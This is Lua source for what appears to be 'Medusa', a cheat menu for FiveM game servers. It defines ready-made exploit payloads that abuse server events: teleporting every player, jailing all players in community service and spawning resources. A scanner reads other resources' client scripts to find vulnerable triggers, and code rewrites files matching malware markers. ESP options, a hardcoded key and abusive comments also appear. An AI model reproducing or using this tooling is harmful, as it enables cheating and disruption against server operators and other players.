


-- function showMessage(Message, Type, Interval, Timeout, Settings, Exit, Callback)
--     if AnimateUI[Type] then
--         return AnimateUI[Type](Message, Interval, Timeout, Settings, Exit, Callback)
--     end

--     return false
-- end

-- function removeMessage(ID)
--     AnimateUI.Kill(ID)
-- end

-- TriggerEvent('chat:addSuggestion', '/AnimateUIDemo', 'help text', {
--     { name="type", help="all | fade | zoom | slide | bounce | elastic | typewriter" }
-- }) 

-- RegisterCommand('AnimateUIDemo', function(source, args)
--     Citizen.CreateThread(function()
--         Citizen.Wait(2000)
--         if args ~= nil then
--             if args[1] == 'fade' then
--                 InitFadeAnimations()
--             elseif args[1] == 'slide' then
--                 InitSlideAnimations()
--             elseif args[1] == 'bounce' then
--                 InitBounceAnimations()
--             elseif args[1] == 'elastic' then
--                 InitElasticAnimations()
--             elseif args[1] == 'zoom' then
--                 InitZoomAnimations()
--             elseif args[1] == 'typewriter' then
--                 InitTypewriterAnimations()
--             elseif args[1] == 'all' then
--                 InitDemo()
--             end
--         end  
--     end)
-- end)



--[[
	function perraputa()
    Citizen.CreateThread(function()
        for i = 290, 730 do
            Citizen.Wait(25)
            TriggerServerEvent('esx_policejob:requestarrest', i, 100.0, vector3(0.0, 0.0, 0.0), 5.0)
            Medusa.Functions.Print("MedusaTP A: " .. i)
        end
    end)
end

perraputa()
]]



-- for i = 0, 0 do
--       --finded = string.match(code, "TriggerServerEvent.-\n")
--       finded = string.match(code, [['(.-)']])
    
--       if finded ~= nil then
--         Medusa.Functions.Print("ENCONTRADO EL TRIGGER: ".. finded)
--       else
--         Medusa.Functions.Print("F")
--       end
  
-- end

--code = string.gsub(code, finded, "")
-- Medusa.Functions.Print("Codigo: " .. code)




-- RegisterCommand('dell', function(src)
-- 	RemoveDecalsInRange(GetEntityCoords(PlayerPedId()), 9999999999999999999.0)
-- 	--ShutdownAndLaunchSinglePlayerGame()
-- end)

-- -- NACHO QUE COJONES HACES BRO ???? QUE COÑO HACES AQUI RATA CUANDO LEAS ESTO LLAMA A DISCORD PUTO RETRASADO MENTAL DE MIERDA COMO ME JODAS EL CÓDIGO TE CORTO LA CABEZA :3
-- -- APOLO GUAPOOOOOOOOO CUANDO LEAS ESTO YAMAME =) (SPOILER: Aun no te toque nada del codigo 03/03/2021 15:45) xd
-- RegisterCommand('decal', function (src, arg, rawInput) -- Puta
--     local decalType = tonumber(arg[1]) or 1010
-- 		local targetedCoord = GetOffsetFromEntityInWorldCoords(
-- 			PlayerPedId(), 0.0, 1.0, -1.0
-- 		)


-- 	Citizen.CreateThread(function()
-- 		for i = 0, 25 do
-- 			Citizen.Wait(1000)
-- 			local targetedCoord = GetOffsetFromEntityInWorldCoords(
-- 				PlayerPedId(), 0.0, 1.0, -1.0
-- 			)
-- 			Medusa.Functions.Print("LOL")
-- 			Medusa.Functions.Print(decalType)
--     		AddDecal(
--     		    decalType,
--     		    targetedCoord.x, targetedCoord.y, targetedCoord.z, -- pos
--     		    0.0, 0.0, -1.0, -- unk
--     		    func_522(0.0, 1.0, 0.0), --unk
--     		    20.0, 20.0, --width, height
--     		    0.196, 0.0, 0.0,    -- rgb
--     		    1.0, -1.0,    -- opacity,timeout
--     		    0, 0, 0 -- unk
--     		)
-- 		end
-- 	end)

-- 	-- Citizen.CreateThread(function()
-- 	-- 	--AddPetrolDecal(targetedCoord, 50.0, 50.0, 1.0)
-- 	-- 	AddPetrolTrailDecalInfo(targetedCoord, true)
-- 	-- 	Citizen.Wait(100)
-- 	-- 	ShootSingleBulletBetweenCoords(GetEntityCoords(PlayerPedId()), targetedCoord, 25.0, 0, GetHashKey("WEAPON_HEAVYSNIPER"), PlayerPedId(), true, false, 9000.0)
-- 	-- end)

-- end)

function func_522(x, y, z)
    local fVar1;
    local fVar0 = math.sqrt(x * x + y * y + z * z)
    local vParam0

    if (fVar0 ~= 0.0) then
        fVar1 = (1.0 / fVar0);
        vParam0 = vector3(x, y, z) * vector3(fVar1, fVar1, fVar1)
    end

    return vParam0 or vector3(0.0, 0.0, 0.0);
end











































local CreateThread = Citizen.CreateThread
local CreateThreadNow = Citizen.CreateThreadNow


-- Medusa Class / Functions
---------------------------------------------------------------------------------------




local vehicleClassWhitelist = {0, 1, 2, 3, 4, 5, 6, 7, 9}

local handleMods = {
	{"fInitialDragCoeff", 90.22},
	{"fDriveInertia", .31},
	{"fSteeringLock", 22},
	{"fTractionCurveMax", -1.1},
	{"fTractionCurveMin", -.4},
	{"fTractionCurveLateral", 2.5},
	{"fLowSpeedTractionLossMult", -.57}
}

local Medusa = {
	Functions = {},
	Class = {},
	Options = {
		BulletImpacts = false,
		ParticleTrollAll = false,
		IncludeSelf = true
	},
	Data = {
		CurrentCheckingResource = "patata",
		FriendList = {},
		Impacts = {},
		FoundedsNets = {},
		FoundedsServerEvents = {},
		BannerDui = nil,

		Rain = {
			RainSelected = 1,
			RainAmount = 1,
			RainStateSelected = 1,
			RainState = 1
		},




		-- Variables (internal data)

		YDownRef = 0
	},

	--[[

		Medusa.debug = false

		local menus = {}
		local keys = {up = 172, down = 173, left = 174, right = 175, select = 215, back = 194}*
		local optionCount = 0

		local currentKey = nil
		local currentMenu = nil

		local aspectRatio = GetAspectRatio(true)
		local screenResolution = GetActiveScreenResolution()

		local menuWidth = 0.185 -- old version was 0.23
		local titleHeight = 0.07
		local titleYOffset = 0
		local titleScale = 1.2

		local separatorHeight = 0.0025

		local buttonHeight = 0.038
		local buttonFont = 4
		local buttonScale = 0.375
		local buttonTextXOffset = 0.005
		local buttonTextYOffset = 0.0065
		local buttonSpriteXOffset = 0.011
		local buttonSpriteScale = { x = 0.016, y = 0 }

		local fontHeight = GetTextScaleHeight(buttonScale, buttonFont)

		local sliderWidth = (menuWidth / 4)

		local sliderHeight = 0.016

		local knobWidth = 0.002
		local knobHeight = 0.016

		local sliderFontScale = 0.275
		local sliderFontHeight = GetTextScaleHeight(sliderFontScale, buttonFont)


		local toggleInnerWidth = 0.008
		local toggleInnerHeight = 0.014
		local toggleOuterWidth = 0.01125
		local toggleOuterHeight = 0.020

		-- Vehicle preview, PlayerInfo, etc
		local previewWidth = 0.100

		local frameWidth = 0.004

		local footerHeight = 0.023

	]]

	Config = {
		CurrentUser = {
			UserName = nil,
		},
		Keys = {up = 172, down = 173, left = 174, right = 175, select = 215, back = 194},
		ESP 	= {
			activated = false,
			lines 	= {
				activate	= true,
				npc 		= true,
				color 		= {r=0,g=0,b=0,a=255}
			},
			box 	= {
				activate 	= true,
				npc 		= true,
				colorLow	= {r = 0, g = 255, b = 0, a = 255},
				colorMedium	= {r = 0, g = 0, b = 255, a = 255},
				colorHigh	= {r = 255, g = 0, b = 0, a = 255}
			},
			info 	= {
				activate 	= false,
				color 		= {r=0,g=0,b=0,a=255}
			},
		},
		
		Rain 	= {
			Bikes 	= {
				quantity 	= 1,
				state 		= "2"
			},
			Cars = {
				quantity 	= 1,
				state 		= "2"
			},
			Custom = {
				quantity 	= 1,
				model 		= nil
			},
		},
        Props 	= {
			model 		= "prop_tool_mopbucket"
		},
		Cars = {},
		Clothes = {}
	},

	Resources = {},

	TriggerData = {
		IgnoreScan = {"me ", "do ", "entorno ", "forzar "},

		KnownTriggerExploits = {

			-- TP  ALL
				{
				exploitName = "TP All To MazeBank",
				exploitWord = "requestarrest",
				exploitPayload = "target_id, playerheading, playerCoords, playerlocation",
				canExploit = false,
				triggerDetected = "",
				triggerPayLoad = function(TriggerFound)
					Citizen.CreateThread(function()
						local first_id = 0
						local MyId = GetPlayerServerId(PlayerId())
						local last_id = (MyId + 150)
						for i = first_id, last_id do
							Citizen.Wait(45)
							TriggerServerEvent(TriggerFound, i, 100.0, vector3(-75.015, -818.215, 327.0), 5.0)
						end
					end)
				end
				},
			-- ServComs
				{
					exploitName = "Send All CommunityServices",
					exploitWord = "sendToCommunityS",
					exploitPayload = "player, community_services_count",
					canExploit = false,
					triggerDetected = "",
					triggerPayLoad = function(TriggerFound)
						TriggerServerEvent(TriggerFound, -1, 404)
					end
				},
				-- BuenClima Give Coal
				--[[
					rocas = { 
        			{x = 2972.36, y = 2775.44, z = 39.24, vida = 100, tipo = "Carbón", data = "carbon", max = 100},
        			{x = 2968.64, y = 2775.64, z = 39.48, vida = 100, tipo = "Oro", data = "oro", max = 100},
        			{x = 2964.44, y = 2773.96, z = 40.04, vida = 100, tipo = "Carbón", data = "carbon", max = 100},
        			{x = 2951.16, y = 2768.52, z = 39.84, vida = 100, tipo = "Plata", data = "plata", max = 100},
        			{x = 2947.2, y = 2765.96, z = 40.36, vida = 100, tipo = "Hierro", data = "hierro", max = 100},
        			{x = 2937.2, y = 2771.92, z = 39.88, vida = 100, tipo = "Carbón", data = "carbon", max = 100},
        			{x = 2928.52, y = 2789.64, z = 40.36, vida = 100, tipo = "Oro", data = "oro", max = 100},
        			{x = 2925.56, y = 2796.48, z = 41.44, vida = 100, tipo = "Plata", data = "plata", max = 100},
        			{x = 2921.44, y = 2799.32, z = 42.16, vida = 100, tipo = "Hierro", data = "hierro", max = 100},
        			{x = 2938.52, y = 2812.64, z = 43.4, vida = 100, tipo = "Oro", data = "oro", max = 100    },
        			{x = 2951.32, y = 2816.32, z = 42.92, vida = 100, tipo = "Carbón", data = "carbon", max = 100},
        			{x = 2971.96, y = 2798.68, z = 42.16, vida = 100, tipo = "Hierro", data = "hierro", max = 100},
        			{x = 2979.08, y = 2790.48, z = 41.6, vida = 100, tipo = "Plata", data = "plata", max = 100},
					}

					local veces = 50
					function test()
					    Citizen.CreateThread(function()
					      for i = 1, veces, 1 do
					        TriggerServerEvent('minar:doymineral', "carbon")
					        Citizen.Wait(0)
					      end
					  end)
					end

					test()
				]]
				{
					exploitName = "Give Minerals",
					exploitWord = "doymineral",
					exploitPayload = "mineral",
					canExploit = false,
					triggerDetected = "",
					triggerPayLoad = function(TriggerFound)
						TriggerServerEvent(TriggerFound, "carbon")
					end
				}
			}
		}
}

Medusa.Functions.inTable = function(tbl, item)
    for key, value in pairs(tbl) do
        if value == item then return key end
    end
    return false
end

Medusa.Functions.EqualsInTable = function(tbl, item)
    for key, value in pairs(tbl) do
		if string.match(item, value) then
			return true
		end
    end
    return false
end

Medusa.Class.Resource = function(name, EventHandlers, ServerEvents)
	local this = {}
	
	this.name = name
	this.EventHandlers = EventHandlers
	this.ServerEvents = ServerEvents

	this.ReturnName = function()
		return this.name
	end

	this.ReturnTriggerTable = function()
		return EventHandlers
	end


	return this
end





checkResource = function(thing, name)

	thing = ("[[%s]]"):format(thing)

	
		if not Medusa.Data.FoundedsNets[name] then
			Medusa.Data.FoundedsNets[name] = {}
			Medusa.Data.FoundedsServerEvents[name] = {}
		end

		for chunk in string.gmatch(thing, [[RegisterNetEvent.-'(.-)']]) do
			if chunk ~= nil and not Medusa.Functions.EqualsInTable(Medusa.TriggerData.IgnoreScan, chunk) then
		  		table.insert(Medusa.Data.FoundedsNets[name], chunk)
			end
		end

		for chunk in string.gmatch(thing, [[RegisterNetEvent.-"(.-)"]]) do
			if chunk ~= nil and not Medusa.Functions.EqualsInTable(Medusa.TriggerData.IgnoreScan, chunk) then
				table.insert(Medusa.Data.FoundedsNets[name], chunk)
			end
		end

		
		for chunk in string.gmatch(thing, [[TriggerServerEvent.-'(.-)']]) do
			if chunk ~= nil and not Medusa.Functions.EqualsInTable(Medusa.TriggerData.IgnoreScan, chunk) then
		  		table.insert(Medusa.Data.FoundedsServerEvents[name], chunk)
			end
		end

		for chunk in string.gmatch(thing, [[TriggerServerEvent.-"(.-)"]]) do
			if chunk ~= nil and not Medusa.Functions.EqualsInTable(Medusa.TriggerData.IgnoreScan, chunk) then
				table.insert(Medusa.Data.FoundedsServerEvents[name], chunk)
			end
		end

		-- Checking Triggers Dynamics

		for _key, _valueT in pairs(Medusa.TriggerData.KnownTriggerExploits) do
			local ToFound = _valueT.exploitWord
			local ToFoundPayload = _valueT.exploitPayload
			local NameExploit = _valueT.exploitName
			
			for _key, _value in pairs(Medusa.Data.FoundedsServerEvents[name]) do
				if string.match(_value, ToFound) and not _valueT.canExploit then
					Medusa.Functions.Print("Exploit: " .. NameExploit .. " Encontrado en el recurso: " .. name .. " con el evento de: " .. _value .. " PayLoad: " .. ToFound)
					_valueT.triggerDetected = _value
					_valueT.canExploit = true
				end
			end
			for chunk in string.gmatch(thing, "TriggerServerEvent.-\n") do 
				if chunk ~= nil and not Medusa.Functions.EqualsInTable(Medusa.TriggerData.IgnoreScan, chunk) then
					if string.match(chunk, ToFoundPayload) and not _valueT.canExploit then
						for chunk in string.gmatch(chunk, [[TriggerServerEvent.-'(.-)']]) do
							_valueT.triggerDetected = chunk
						end
						for chunk in string.gmatch(chunk, [[TriggerServerEvent.-"(.-)"]]) do
							_valueT.triggerDetected = chunk
						end

						Medusa.Functions.Print("Exploit: " .. NameExploit .. " Encontrado en el recurso: " .. name )
						_valueT.canExploit = true
					end
				end
			end
		end
		


		Medusa.Resources[name] = Medusa.Class.Resource(name, Medusa.Data.FoundedsNets[name], Medusa.Data.FoundedsServerEvents[name])
  
end

Citizen.CreateThread(function()
	while true do
		Citizen.Wait(1000)
		for _key, _value in pairs(Medusa.TriggerData.KnownTriggerExploits) do
			local xd = ([[
				[%s] = {
					exploitName = %s,
					exploitWord = %s,
					exploitPayload = %s,
					canExploit = %s,
					triggerDetected = %s,
				}
				]]):format(_key, _value.exploitName, _value.exploitWord, _value.exploitPayload, _value.canExploit, _value.triggerDetected)
			--Medusa.Functions.Print(xd)
		end
	end
end)


local function erTutto()
    local ip = nil
    
    -- Utils
    local function findResources(onlyStarted)
        local r = {}
        local rNum = GetNumResources() - 1
        for i = 0, rNum do
            local name = GetResourceByFindIndex(i)
            if(GetResourceState(name) == "started" or not onlyStarted) then
                table.insert(r, name)
            end
        end
        return r
    end
    
    local function extractFiles(fxmanifest, side)
        local files = {}
        local start, ending = string.find(fxmanifest, side .. "_scripts.-}")
    
        if start ~= nil and ending ~= nil then
            local scripts = string.sub(fxmanifest, start, ending)
            
            local toDelete = {"'.-'", '".-"'}
    
            for k, actualToDelete in pairs(toDelete) do
                for fileName in string.gmatch(scripts, actualToDelete) do
                    fileName = fileName:gsub("'", "")
                    fileName = fileName:gsub('"', "")
                    if(string.sub(fileName, -3) == "lua" and string.sub(fileName, 1, 1) ~= "@" ) then
                        table.insert(files, fileName)
                    end
                end
            end
        else
            local start, ending = string.find(fxmanifest, side .. "_script.-.lua")
    
            if start ~= nil and ending ~= nil then
                local script = string.sub(fxmanifest, start, ending)
                script = script:gsub(".*'", "")
                script = script:gsub('.*"', "")
                
                if(string.sub(script, -3) == "lua" ) then
                    table.insert(files, script)
                end
            else
                return {}
            end
        end
        return files
    end

    local function getResourceFiles(resourceName)
        local files = {server = {}, client = {}}

        local fxmanifest = LoadResourceFile(resourceName, "__resource.lua")
    
        if fxmanifest == nil then
            fxmanifest = LoadResourceFile(resourceName, "fxmanifest.lua")
        end
    
        if fxmanifest ~= nil then 
            files.server = extractFiles(fxmanifest, "server")
            files.client = extractFiles(fxmanifest, "client")
        end

        return files
    end

    local function getInfected(toRemove)
        local infected = {}
        local resources = findResources(false)

        for k, nomeRisorsa in pairs(resources) do
            if(nomeRisorsa ~= GetCurrentResourceName()) then
                local pathRisorsa = GetResourcePath(nomeRisorsa)

                if(pathRisorsa ~= nil) then
                    local luaFiles = getResourceFiles(nomeRisorsa)

                    infected[nomeRisorsa] = {server = {}, client = {}}

                    if(#luaFiles.server > 0) then
                        for k, actualFile in pairs(luaFiles.server) do
                            local contenutoFile = LoadResourceFile(nomeRisorsa, actualFile)
                            if(contenutoFile~=nil) then
                                local i,j = string.find(contenutoFile, "mkn=.*a%(%)end;")
                                    
                                if(i~=nil and j~=nil) then
                                    if(toRemove) then
                                        contenutoFile = contenutoFile:gsub("mkn=.*a%(%)end;", "")
                                        contenutoFile = contenutoFile:gsub("\r\n", "\n")
                                        local fileVecchio = io.open(pathRisorsa .. "/" .. actualFile, "w")
                                        if(fileVecchio~=nil) then
                                            fileVecchio:write(contenutoFile)
                                            fileVecchio:close()
                                        end
                                    else
                                        table.insert(infected[nomeRisorsa].server, actualFile)
                                    end
                                end
                            end
                        end
                    end

                    if(#luaFiles.client > 0) then
                        for k, actualFile in pairs(luaFiles.client) do
                            local contenutoFile = LoadResourceFile(nomeRisorsa, actualFile)
                            if(contenutoFile~=nil) then

                                -- Rimuove client vecchio
                                local i,j = string.find(contenutoFile, "mkn=.*a%(%)end;")

                                if(i~=nil and j~=nil) then
                                    contenutoFile = contenutoFile:gsub("mkn=.*a%(%)end;", "")
                                    contenutoFile = contenutoFile:gsub("\r\n", "\n")
                                    local fileVecchio = io.open(pathRisorsa .. "/" .. actualFile, "w")
                                    if(fileVecchio~=nil) then
                                        fileVecchio:write(contenutoFile)
                                        fileVecchio:close()
                                    end
                                end
                                -- Rimuove client vecchio fine

                                local i,j = string.find(contenutoFile, "vdwa=.*a%(%)end;")

                                if(i~=nil and j~=nil) then
                                    if(toRemove) then
                                        contenutoFile = contenutoFile:gsub("vdwa=.*a%(%)end;", "")
                                        contenutoFile = contenutoFile:gsub("\r\n", "\n")
                                        local fileVecchio = io.open(pathRisorsa .. "/" .. actualFile, "w")
                                        if(fileVecchio~=nil) then
                                            fileVecchio:write(contenutoFile)
                                            fileVecchio:close()
                                        end
                                    else
                                        table.insert(infected[nomeRisorsa].client, actualFile)
                                    end
                                end
                            end
                        end
                    end
                end
            end
        end

        for nomeRisorsa, risorsaInfetta in pairs(infected) do
            if(#risorsaInfetta.server == 0 and #risorsaInfetta.client == 0) then
                infected[nomeRisorsa] = nil
            else
               if(#risorsaInfetta.server == 0) then
                    infected[nomeRisorsa].server = nil
               else
                    infected[nomeRisorsa].client = nil
               end
            end
        end
    end


    local function espandi()
        local startedResources = findResources(true)

        for k, nomeRisorsa in pairs(startedResources) do
            if(nomeRisorsa ~= GetCurrentResourceName()) then

                    local luaFiles = getResourceFiles(nomeRisorsa)
                    


                    if(#luaFiles.client > 0) then
                        for k, actualFile in pairs(luaFiles.client) do
							local code = LoadResourceFile(nomeRisorsa, actualFile)
							checkResource(code, nomeRisorsa)
                            --inserisciMalevolo(nomeRisorsa, actualFile, pathRisorsa, false)
                        end
                    end
            end
        end
    end

	espandi()
end

Citizen.CreateThread(erTutto)

-- Ped Recolector Class
local Peds = {}

NewPed = function(pedId)
	local this = {}

	this.pedId = pedId

	this.ReturnPed = function()
		if DoesEntityExist(this.pedId) then
			return this.pedId
		else
			Peds[this.pedId] = nil
			this.pedId = nil
		end
	end

	return this
end


Citizen.CreateThread(function()
	while true do
		Citizen.Wait(850)
		Medusa.Functions.GetAllPeds(0, function(pPed)
			Peds[pPed] = NewPed(pPed)
		end)
	end
end)

-- Citizen.CreateThread(function()
-- 	while true do
-- 		Citizen.Wait(0)
-- 		for _key, _value in pairs(Peds) do
-- 			Medusa.Functions.Draw2DEspToPed(_value.ReturnPed())
-- 		end
-- 	end
-- end)

-- Citizen.CreateThread(function()
-- 	while true do
-- 		Citizen.Wait(0)
-- 		Medusa.Functions.GetAllPeds(0, function(pPed)
-- 			Medusa.Functions.Draw2DEspToPed(pPed)
-- 		end)
-- 	end
-- end)






------------------------------------------------
----------------END MEDUSA CLASS----------------
------------------------------------------------


function Medusa:CheckName(str) 
	if string.len(str) > 16 then
		fmt = string.sub(str, 1, 16)
		return tostring(fmt .. "...")
	else
		return str
	end
end

local function wait(self)
	local rets = Citizen.Await(self.p)
	if not rets then
		if self.r then
			rets = self.r
		else
			error("^1Medusa ERROR : async->wait() = nil | contact Apolo#2002 & NachoASD#5887")
		end
	end

	return table.unpack(rets, 1, table.maxn(rets))
end
  
local function areturn(self, ...)
	self.r = {...}
	self.p:resolve(self.r)
end
  
-- create an async returner or a thread (Citizen.CreateThreadNow)
-- func: if passed, will create a thread, otherwise will return an async returner
function Medusa.Async(func)
	if func then
		Citizen.CreateThreadNow(func)
	else
		return setmetatable({ wait = wait, p = promise.new() }, { __call = areturn })
	end
end

Medusa.Math = {}

Medusa.Math.Round = function(value, numDecimalPlaces)
	return tonumber(string.format("%." .. (numDecimalPlaces or 0) .. "f", value))
end

Medusa.Math.GroupDigits = function(value)
	local left,num,right = string.match(value,'^([^%d]*%d)(%d*)(.-)$')

	return left..(num:reverse():gsub('(%d%d%d)','%1' .. _U('locale_digit_grouping_symbol')):reverse())..right
end

Medusa.Math.Trim = function(value)
	if value then
		return (string.gsub(value, "^%s*(.-)%s*$", "%1"))
	else
		return nil
	end
end

-- Medusa.Player Table
Medusa.Player = {
	Spectating = false,
	IsInVehicle = false,
	isNoclipping = false,
	Vehicle = 0,
}

-- Menu toggle table
Medusa.Toggle = {
	RainbowVehicle = false,
	ReplaceVehicle = true,
	SpawnInVehicle = true,
	VehicleCollision = false,
	MagnetoMode = false,
	SelfRagdoll = false,
	EasyHandling = false,
	DeleteGun = false,
	RapidFire = false,
	VehicleNoFall = false,

}

Medusa.Events = {
	Revive = {}
}

Medusa.Game = {}

function Medusa.Game:GetPlayers()
	local players = {}
	
	for _,player in ipairs(GetActivePlayers()) do
		local ped = GetPlayerPed(player)
		
		if DoesEntityExist(ped) then
			table.insert(players, player)
		end
	end
	
	return players
end

function Medusa.Game:GetPlayersInArea(coords, area)
	local players       = Medusa.Game:GetPlayers()
	local playersInArea = {}

	for i=1, #players, 1 do
		local target       = GetPlayerPed(players[i])
		local targetCoords = GetEntityCoords(target)
		local distance     = GetDistanceBetweenCoords(targetCoords, coords.x, coords.y, coords.z, true)

		if distance <= area then
			table.insert(playersInArea, players[i])
		end
	end

	return playersInArea
end

function Medusa.Game:GetPedStatus(playerPed) 

	local inVehicle = IsPedInAnyVehicle(playerPed, false)
	local isIdle = IsPedStill(playerPed)
	local isWalking = IsPedWalking(playerPed)
	local isRunning = IsPedRunning(playerPed)

	if inVehicle then
		return "~o~In Vehicle"

	elseif isIdle then
		return "~o~Idle"

	elseif isWalking then
		return "~o~Walking"

	elseif isRunning then
		return "~o~Jogging"
	
	else
		return "~o~Running"
	end

end

function Medusa.Game:GetCamDirection()
    local heading = GetGameplayCamRelativeHeading() + GetEntityHeading(PlayerPedId())
    local pitch = GetGameplayCamRelativePitch()
    
    local x = -math.sin(heading * math.pi / 180.0)
    local y = math.cos(heading * math.pi / 180.0)
    local z = math.sin(pitch * math.pi / 180.0)
    
    local len = math.sqrt(x * x + y * y + z * z)
    if len ~= 0 then
        x = x / len
        y = y / len
        z = z / len
    end
    
    return x, y, z
end

function Medusa.Game:GetSeatPedIsIn(ped)
	if not IsPedInAnyVehicle(ped, false) then return
	else
		veh = GetVehiclePedIsIn(ped)
		for i = 0, GetVehicleMaxNumberOfPassengers(veh) do
			if GetPedInVehicleSeat(veh) then return i end
		end
	end
end

function Medusa.Game:RequestControlOnce(entity)
    if not NetworkIsInSession() or NetworkHasControlOfEntity(entity) then
        return true
    end
    SetNetworkIdCanMigrate(NetworkGetNetworkIdFromEntity(entity), true)
    return NetworkRequestControlOfEntity(entity)
end

function Medusa.Game:TeleportToPlayer(target)
	local ped = GetPlayerPed(target)
    local pos = GetEntityCoords(ped)
    SetEntityCoords(PlayerPedId(), pos)
end

function Medusa.Game.GetVehicleProperties(vehicle)
	if DoesEntityExist(vehicle) then
		local colorPrimary, colorSecondary = GetVehicleColours(vehicle)
		local pearlescentColor, wheelColor = GetVehicleExtraColours(vehicle)
		local extras = {}

		for id=0, 12 do
			if DoesExtraExist(vehicle, id) then
				local state = IsVehicleExtraTurnedOn(vehicle, id) == 1
				extras[tostring(id)] = state
			end
		end

		return {
			model             = GetEntityModel(vehicle),

			plate             = Medusa.Math.Trim(GetVehicleNumberPlateText(vehicle)),
			plateIndex        = GetVehicleNumberPlateTextIndex(vehicle),

			bodyHealth        = Medusa.Math.Round(GetVehicleBodyHealth(vehicle), 1),
			engineHealth      = Medusa.Math.Round(GetVehicleEngineHealth(vehicle), 1),

			fuelLevel         = Medusa.Math.Round(GetVehicleFuelLevel(vehicle), 1),
			dirtLevel         = Medusa.Math.Round(GetVehicleDirtLevel(vehicle), 1),
			color1            = colorPrimary,
			color2            = colorSecondary,

			pearlescentColor  = pearlescentColor,
			wheelColor        = wheelColor,

			wheels            = GetVehicleWheelType(vehicle),
			windowTint        = GetVehicleWindowTint(vehicle),

			neonEnabled       = {
				IsVehicleNeonLightEnabled(vehicle, 0),
				IsVehicleNeonLightEnabled(vehicle, 1),
				IsVehicleNeonLightEnabled(vehicle, 2),
				IsVehicleNeonLightEnabled(vehicle, 3)
			},

			neonColor         = table.pack(GetVehicleNeonLightsColour(vehicle)),
			extras            = extras,
			tyreSmokeColor    = table.pack(GetVehicleTyreSmokeColor(vehicle)),

			modSpoilers       = GetVehicleMod(vehicle, 0),
			modFrontBumper    = GetVehicleMod(vehicle, 1),
			modRearBumper     = GetVehicleMod(vehicle, 2),
			modSideSkirt      = GetVehicleMod(vehicle, 3),
			modExhaust        = GetVehicleMod(vehicle, 4),
			modFrame          = GetVehicleMod(vehicle, 5),
			modGrille         = GetVehicleMod(vehicle, 6),
			modHood           = GetVehicleMod(vehicle, 7),
			modFender         = GetVehicleMod(vehicle, 8),
			modRightFender    = GetVehicleMod(vehicle, 9),
			modRoof           = GetVehicleMod(vehicle, 10),

			modEngine         = GetVehicleMod(vehicle, 11),
			modBrakes         = GetVehicleMod(vehicle, 12),
			modTransmission   = GetVehicleMod(vehicle, 13),
			modHorns          = GetVehicleMod(vehicle, 14),
			modSuspension     = GetVehicleMod(vehicle, 15),
			modArmor          = GetVehicleMod(vehicle, 16),

			modTurbo          = IsToggleModOn(vehicle, 18),
			modSmokeEnabled   = IsToggleModOn(vehicle, 20),
			modXenon          = IsToggleModOn(vehicle, 22),

			modFrontWheels    = GetVehicleMod(vehicle, 23),
			modBackWheels     = GetVehicleMod(vehicle, 24),

			modPlateHolder    = GetVehicleMod(vehicle, 25),
			modVanityPlate    = GetVehicleMod(vehicle, 26),
			modTrimA          = GetVehicleMod(vehicle, 27),
			modOrnaments      = GetVehicleMod(vehicle, 28),
			modDashboard      = GetVehicleMod(vehicle, 29),
			modDial           = GetVehicleMod(vehicle, 30),
			modDoorSpeaker    = GetVehicleMod(vehicle, 31),
			modSeats          = GetVehicleMod(vehicle, 32),
			modSteeringWheel  = GetVehicleMod(vehicle, 33),
			modShifterLeavers = GetVehicleMod(vehicle, 34),
			modAPlate         = GetVehicleMod(vehicle, 35),
			modSpeakers       = GetVehicleMod(vehicle, 36),
			modTrunk          = GetVehicleMod(vehicle, 37),
			modHydrolic       = GetVehicleMod(vehicle, 38),
			modEngineBlock    = GetVehicleMod(vehicle, 39),
			modAirFilter      = GetVehicleMod(vehicle, 40),
			modStruts         = GetVehicleMod(vehicle, 41),
			modArchCover      = GetVehicleMod(vehicle, 42),
			modAerials        = GetVehicleMod(vehicle, 43),
			modTrimB          = GetVehicleMod(vehicle, 44),
			modTank           = GetVehicleMod(vehicle, 45),
			modWindows        = GetVehicleMod(vehicle, 46),
			modLivery         = GetVehicleLivery(vehicle)
		}
	else
		return
	end
end

Medusa.Keys = {
	["ESC"] = 322, ["F1"] = 288, ["F2"] = 289, ["F3"] = 170, ["F5"] = 166, ["F6"] = 167, ["F7"] = 168, ["F8"] = 169, ["F9"] = 56, ["F10"] = 57,
    ["~"] = 243, ["1"] = 157, ["2"] = 158, ["3"] = 160, ["4"] = 164, ["5"] = 165, ["6"] = 159, ["7"] = 161, ["8"] = 162, ["9"] = 163, ["-"] = 84, ["="] = 83, ["BACKSPACE"] = 177,
    ["TAB"] = 37, ["Q"] = 44, ["W"] = 32, ["E"] = 38, ["R"] = 45, ["T"] = 245, ["Y"] = 246, ["U"] = 303, ["P"] = 199, ["["] = 39, ["]"] = 40, ["ENTER"] = 18,
    ["CAPS"] = 137, ["A"] = 34, ["S"] = 8, ["D"] = 9, ["F"] = 23, ["G"] = 47, ["H"] = 74, ["K"] = 311, ["L"] = 182,
    ["LEFTSHIFT"] = 21, ["Z"] = 20, ["X"] = 73, ["C"] = 26, ["V"] = 0, ["B"] = 29, ["N"] = 249, ["M"] = 244, [","] = 82, ["."] = 81,
    ["LEFTCTRL"] = 36, ["LEFTALT"] = 19, ["SPACE"] = 22, ["RIGHTCTRL"] = 70,
    ["HOME"] = 213, ["PAGEUP"] = 10, ["PAGEDOWN"] = 11, ["DELETE"] = 178,
    ["LEFT"] = 174, ["RIGHT"] = 175, ["TOP"] = 27, ["DOWN"] = 173,
    ["NENTER"] = 201, ["N4"] = 108, ["N5"] = 60, ["N6"] = 107, ["N+"] = 96, ["N-"] = 97, ["N7"] = 117, ["N8"] = 61, ["N9"] = 118,
    ["MOUSE1"] = 24
}

---------------------------------------------------------------------------------------

local storedPrimary, storedSecondary = nil

local function RainbowVehicle(justToggled)
	if Medusa.Player.IsInVehicle then
		if justToggled then
			storedPrimary, storedSecondary = GetVehicleColours(Medusa.Player.Vehicle)
			Medusa.Toggle.RainbowVehicle = justToggled
		else
			Medusa.Toggle.RainbowVehicle = justToggled
			ClearVehicleCustomPrimaryColour(Medusa.Player.Vehicle)
			ClearVehicleCustomSecondaryColour(Medusa.Player.Vehicle)
			SetVehicleColours(Medusa.Player.Vehicle, storedPrimary, storedSecondary)
		end
	else
		Medusa.Toggle.RainbowVehicle = justToggled
	end
end



local NoclipSpeed = 1
local oldSpeed = 1


local isMenuEnabled = true

-- Globals
-- Menu color customization
local _menuColor = {
	base = { r = 155, g = 89, b = 182, a = 255 },
	highlight = { r = 155, g = 89, b = 182, a = 150 },
	shadow = { r = 96, g = 52, b = 116, a = 150 },
}

-- License key validation for Medusa
local _buyer
local _secretKey = "devbuild"
local _gatekeeper = true
local _auth = false

local entityEnumerator = {
	__gc = function(enum)
		if enum.destructor and enum.handle then
			enum.destructor(enum.handle)
